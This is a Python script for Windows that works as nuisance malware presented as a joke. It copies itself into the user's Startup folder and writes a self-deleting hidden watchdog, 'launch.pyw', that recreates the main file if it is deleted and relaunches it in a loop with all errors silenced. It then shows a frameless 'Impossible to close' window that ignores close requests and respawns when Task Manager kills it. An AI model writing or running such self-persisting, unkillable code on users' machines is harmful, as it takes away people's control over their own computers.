import os
import sys
import time
import shutil

shutil.copy(__file__, '%s/Microsoft/Windows/Start Menu/Programs/Startup' %os.getenv('APPDATA'))
with open('app_is_running', 'w') as f:
    f.write('lol')

run = False
if os.path.exists('random_file'):
    os.remove('random_file')
    time.sleep(0.5)
    if os.path.exists('random_file'): # launch.pyw hasn't been created yet
        run = True

if not run:
    with open(__file__) as f:
        content = f.read()
    with open('launch.pyw', 'w') as f:
        f.write('''import os
import subprocess
import time
import os

if os.path.exists('launch.pyw'): # remove itself
    os.remove('launch.pyw')

def regen_file(): # tell the main file to run instead of creating a new launch.pyw
    if not os.path.exists('random_file'):
        with open('random_file', 'w') as f:
            f.write('never gonna give you up')

def regen_main_file(): # recreate the main file if deleted
    if not os.path.exists(main_file_path):
        with open(main_file_path, 'w') as f:
            f.write(main_file_content)

time.sleep(2)
if os.path.exists('app_is_running'):
    os.remove('app_is_running')

def run():
    while True:
        try:
            if not os.path.exists('app_is_running'):
                if not os.path.exists(main_file_path):
                    regen_main_file()
                os.startfile('"%%s"' %%main_file_path)
                start = time.time()
                while not os.path.exists('app_is_running') and time.time()-start < 2:
                    regen_file()
            regen_file()
            regen_main_file()
            time.sleep(0.01)
        except: # something went wrong, please remove this when debugging
            pass

# to recreate the main file if needed
main_file_path = r'%s'
main_file_content = \"\"\"
%s
\"\"\"
run()
''' %(os.path.abspath(__file__), content))
    os.startfile('launch.pyw')
    sys.exit()

import win32api
import win32con
import win32gui
import pygame
from pygame.locals import *
from pygame.math import Vector2
from threading import Thread

def top_bar():
    pygame.draw.rect(screen, (255, 255, 255), Rect((0, 0), (WIDTH, 30)))
    pygame.draw.rect(screen, (0, 0, 0), Rect((7, 7), (15, 15)))
    screen.blit(font.render('Impossible to close', True, (0, 0, 0)), (29, 8))
    pygame.draw.line(screen, (0, 0, 0), (WIDTH-30, 10), (WIDTH-20, 20), 2)
    pygame.draw.line(screen, (0, 0, 0), (WIDTH-30, 20), (WIDTH-20, 10), 2)
    pygame.draw.line(screen, (200, 200, 200), (WIDTH-65, 10), (WIDTH-65, 19))
    pygame.draw.line(screen, (200, 200, 200), (WIDTH-65, 10), (WIDTH-74, 10))
    pygame.draw.line(screen, (200, 200, 200), (WIDTH-65, 19), (WIDTH-74, 19))
    pygame.draw.line(screen, (200, 200, 200), (WIDTH-74, 10), (WIDTH-74, 19))
    pygame.draw.line(screen, (0, 0, 0), (WIDTH-120, 15), (WIDTH-110, 15))

pygame.init()

WIDTH, HEIGHT = (640, 480)
screen = pygame.display.set_mode((WIDTH, HEIGHT), NOFRAME)
pygame.display.set_caption('Impossible to close')
clock = pygame.time.Clock()
font = pygame.font.SysFont('calibri', 14)
big_font = pygame.font.SysFont('comic sans ms', 100)

hwnd = pygame.display.get_wm_info()['window']
win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_LAYERED)
win32gui.SetLayeredWindowAttributes(hwnd, win32api.RGB(0, 255, 0), 0, win32con.LWA_COLORKEY)

pos = Vector2()
speed = Vector2()

time_passed = 0
while True:
    for event in pygame.event.get():
        if event.type == QUIT:
            if os.path.exists('app_is_running'):
                os.remove('app_is_running')
            # remove the file, but do not close the window:
            # - user tried to close: punish them with another window
            # - task manager: task mgr will then close this window but another has opened

    screen.fill((0, 0, 0))
    top_bar()
    text = big_font.render('haha lol', False, (0, 255, 0))
    w, h = text.get_size()
    screen.blit(text, (WIDTH//2-w//2, HEIGHT//2+15-h//2))

    speed += (Vector2(pygame.mouse.get_pos())-pos)*time_passed*500
    speed *= 0.8**(100*time_passed)
    pos += speed*time_passed
    pygame.draw.circle(screen, (0, 255, 0), pos, 30)

    pygame.display.flip()
    time_passed = clock.tick()/1000
